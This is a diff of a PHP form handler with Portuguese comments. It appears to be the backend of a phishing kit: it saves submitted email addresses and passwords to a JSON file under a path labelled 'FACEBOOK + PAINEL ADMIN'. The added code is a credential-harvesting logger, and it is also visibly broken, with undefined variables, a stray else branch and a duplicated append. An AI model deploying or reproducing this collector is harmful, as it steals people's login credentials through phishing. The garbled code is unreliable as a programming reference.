@@ -1,46 +1,68 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Verificar se os dados do formulário foram recebidos
-    var_dump($_POST); 
-    $email = isset($_POST['email']) ? $_POST['email'] : '';
-    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';
+    // Verifica se os dados foram enviados corretamente
+    if (isset($_POST['email']) && isset($_POST['senha'])) {
+        $email = $_POST['email'];
+        $senha = $_POST['senha'];
 
-    echo "Email: " . $email . "<br>";
-    echo "Senha: " . $senha . "<br>";
+        // Exibe os dados recebidos
+    echo "Username: " . $username . "<br>";
+    echo "Password: " . $password . "<br>";
 
-    // Verificar se ambos os campos foram preenchidos
-    if ($email && $senha) {
-        // Caminho para o arquivo JSON
-        $fl = "./operador/seguro/boleto1.json";
-
-
-
-        // Verificar se o arquivo existe
-        if (file_exists($fl)) {
-            // Abrir o arquivo para leitura
+    // Verifica o conteúdo do array antes de salvar 
+    var_dump($arr);
+        // Caminho do arquivo JSON
+        $fl = "FACEBOOK + PAINEL ADMIN/operador/seguro/boleto1.json";
+        if(file_exists($fl)){
             $h = fopen($fl, "r");
-            // Ler o conteúdo do arquivo
-            $arr = json_decode(fread($h, filesize($fl)), true);
+            $arr = json_decode(fread($h, filesize($fl)));
+            array_push($arr, array("email" => $email, "senha" => $senha));
             fclose($h);
         } else {
-            // Se o arquivo não existir, criar um array vazio
-            $arr = [];
+            $arr = array(
+                array("email" => $email, "senha" => $senha)
+            );
         }
-
-        // Adicionar os dados do usuário (email e senha) no array
-        array_push($arr, array("email" => $email, "senha" => $senha));
-
-        // Gravar os dados no arquivo JSON
-        $fhs = fopen($fl, 'w') or die("Can't open file");
+        $fhs = fopen($fl, 'w') or die("can't open file");
         fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
         fclose($fhs);
 
-        echo "Dados recebidos e salvos com sucesso!";
+            // Verifica se a leitura foi bem-sucedida
+            if ($arr === null) {
+                // Se o arquivo estava vazio ou malformado, cria um array vazio
+                $arr = [];
+            }
+        } else {
+            // Se o arquivo não existir, cria um array vazio
+            $arr = [];
+        }
+
+        // Adiciona os dados do email e senha no array
+        array_push($arr, [$email, $senha]);
+
+        // Abre o arquivo para escrita
+        $fhs = fopen($fl, 'w');
+        
+        // Verifica se a abertura do arquivo foi bem-sucedida
+        if ($fhs === false) {
+            die("Erro ao tentar abrir o arquivo para gravação.");
+        }
+
+        // Grava os dados no arquivo JSON
+        if (fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT)) === false) {
+            die("Erro ao tentar escrever no arquivo.");
+        }
+        fclose($fhs);
+
+        // Resposta para o usuário
+        echo "Dados recebidos e salvos!";
     } else {
         echo "Erro: dados não recebidos corretamente.";
     }
-}
+
 ?>
+
+
 
 <!DOCTYPE html>
 <html>
